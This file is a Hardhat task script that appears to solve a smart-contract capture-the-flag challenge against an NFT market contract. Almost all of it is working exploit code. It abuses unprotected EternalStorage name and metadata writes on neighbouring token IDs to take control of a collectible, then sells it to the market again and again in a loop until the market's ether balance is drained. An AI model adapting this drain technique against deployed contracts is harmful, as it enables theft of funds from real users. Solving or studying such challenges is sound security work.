import { BigNumber, Contract, utils } from 'ethers'
import { formatEther, parseEther } from 'ethers/lib/utils'
import { task } from 'hardhat/config'

task('market')
  .addOptionalPositionalParam('setupAddress')
  .setAction(async ({ setupAddress }, { run, ethers }) => {
    await run('compile')

    // get signer

    const signer = (await ethers.getSigners())[0]
    console.log('Signer')
    console.log('  at', signer.address)

    // setup problem

    let setup: Contract
    if (setupAddress) {
      setup = await ethers.getContractAt(
        'contracts/market/Setup.sol:Setup',
        setupAddress,
      )
    } else {
      setup = await (
        await ethers.getContractFactory('contracts/market/Setup.sol:Setup')
      ).deploy({ value: parseEther('50') })
    }
    console.log('Setup')
    console.log('  at', setup.address)

    // init contracts

    const market = await ethers.getContractAt(
      'CryptoCollectiblesMarket',
      await setup.market(),
    )
    console.log('CryptoCollectiblesMarket')
    console.log('  at', market.address)

    const nft = await ethers.getContractAt(
      'CryptoCollectibles',
      await setup.token(),
    )
    console.log('CryptoCollectibles')
    console.log('  at', nft.address)

    const storage = await ethers.getContractAt(
      'EternalStorageAPI',
      await setup.eternalStorage(),
    )
    console.log('EternalStorage')
    console.log('  at', storage.address)

    // perform exploit

    console.log('Market')
    console.log(
      '  balance',
      formatEther(await market.provider.getBalance(market.address)),
    )

    const tokenID = await market.callStatic.mintCollectible({
      value: parseEther('5'),
    })
    const tokenID_sub1 = BigNumber.from(tokenID).sub(1).toHexString()
    const tokenID_sub2 = BigNumber.from(tokenID).sub(2).toHexString()

    // minMintPrice = (sentValue * 10000) / (10000 + mintFeeBps)
    // sentValue = minMintPrice * (10000 + mintFeeBps) / 10000
    const value = (await market.minMintPrice())
      .mul((await market.mintFeeBps()).add(10000))
      .div(10000)
    // const value = parseEther('5')
    await market.mintCollectible({ value })

    console.log('NFT')
    console.log('  id', tokenID)
    console.log('  name', await storage.getName(tokenID))
    console.log('  metadata', await storage.getMetadata(tokenID_sub2))

    await storage.updateName(tokenID, utils.zeroPad(signer.address, 32))

    console.log('NFT')
    console.log('  id', tokenID)
    console.log('  name', await storage.getName(tokenID))
    console.log('  metadata', await storage.getMetadata(tokenID_sub2))

    await storage.updateName(tokenID_sub1, utils.zeroPad(signer.address, 32))

    console.log('NFT')
    console.log('  id', tokenID)
    console.log('  name', await storage.getName(tokenID))
    console.log('  metadata', await storage.getMetadata(tokenID_sub2))

    console.log('Market')
    console.log(
      '  balance',
      formatEther(await market.provider.getBalance(market.address)),
    )

    await nft.approve(tokenID, market.address)
    await market.sellCollectible(tokenID)

    console.log('NFT')
    console.log('  id', tokenID)
    console.log('  name', await storage.getName(tokenID))
    console.log('  metadata', await storage.getMetadata(tokenID_sub2))

    console.log('Market')
    console.log(
      '  balance',
      formatEther(await market.provider.getBalance(market.address)),
    )

    let balance = await market.provider.getBalance(market.address)

    while (balance.gt(0)) {
      await storage.updateMetadata(tokenID_sub2, signer.address)

      await nft.approve(tokenID, market.address)
      await market.sellCollectible(tokenID)

      balance = await market.provider.getBalance(market.address)

      console.log('Market')
      console.log('  balance', formatEther(balance))
    }

    // verify

    console.log('Success?', await setup.isSolved())
  })
